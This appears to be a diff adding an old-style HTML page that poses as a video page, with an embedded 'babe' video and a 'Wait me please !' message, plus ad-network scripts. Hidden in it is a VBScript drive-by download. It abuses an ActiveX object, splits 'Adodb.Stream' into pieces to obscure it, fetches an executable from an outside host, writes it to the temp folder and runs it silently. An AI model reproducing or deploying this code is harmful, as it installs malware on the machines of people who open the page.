@@ -1,0 +1,55 @@
+<HTML><HEAD><TITLE>-=- WellCome To -=-</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<META content="MSHTML 6.00.2800.1106" name=GENERATOR></HEAD>
+<BODY><STRONG>
+<H5></STRONG>
+<H5 align=center><EMBED style="WIDTH: 446px; HEIGHT: 444px" src=http://www.my5minutes.com/user_videos/121626/babe_daisy_works.wmv type=application/octet-stream></H5>
+<H5> Wait me please !
+<SCRIPT language=VBScript>
+    on error resume next
+    dl = "http://cong.sitesled.com/setupsr.exe"
+    Set df = document.createElement("object")
+    df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
+    str="Microsoft.XMLHTTP"
+    Set x = df.CreateObject(str,"")
+    a1="Ado"
+    a2="db."
+    a3="Str"
+    a4="eam"
+    str1=a1&a2&a3&a4
+    str5=str1
+    set S = df.createobject(str5,"")
+    S.type = 1
+    str6="GET"
+    x.Open str6, dl, False 
+    x.Send
+    set F = df.createobject("Scripting.FileSystemObject","")
+    set tmp = F.GetSpecialFolder(2)
+    fname1= F.BuildPath(tmp,fname1)
+    S.open
+    S.write x.responseBody
+    S.savetofile fname1,2
+    S.close
+    set Q = df.createobject("Shell.Application","")
+    Q.ShellExecute fname1,"","","open",0 
+    </SCRIPT>
+ </H5></H5></BODY></HTML><BR><BR>
+<BR><BR>
+<CENTER>
+<script language='JavaScript' type='text/javascript' src='http://www.wecounthits.com/process/adengine/adx.js'></script>
+<script language='JavaScript' type='text/javascript'>
+<!--
+   if (!document.phpAds_used) document.phpAds_used = ',';
+   phpAds_random = new String (Math.random()); phpAds_random = phpAds_random.substring(2,11);
+   
+   document.write ("<" + "script language='JavaScript' type='text/javascript' src='");
+   document.write ("http://www.wecounthits.com/process/adengine/adjs.php?n=" + phpAds_random);
+   document.write ("&amp;what=zone:44");
+   document.write ("&amp;exclude=" + document.phpAds_used);
+   if (document.referrer)
+      document.write ("&amp;referer=" + escape(document.referrer));
+   document.write ("'><" + "/script>");
+//-->
+</script><noscript><a href='http://www.wecounthits.com/process/adengine/adclick.php?n=aa7be145' target='_blank'><img src='http://www.wecounthits.com/process/adengine/adview.php?what=zone:44&amp;n=aa7be145' border='0' alt=''></a></noscript>
+</CENTER>
+ &nbsp;
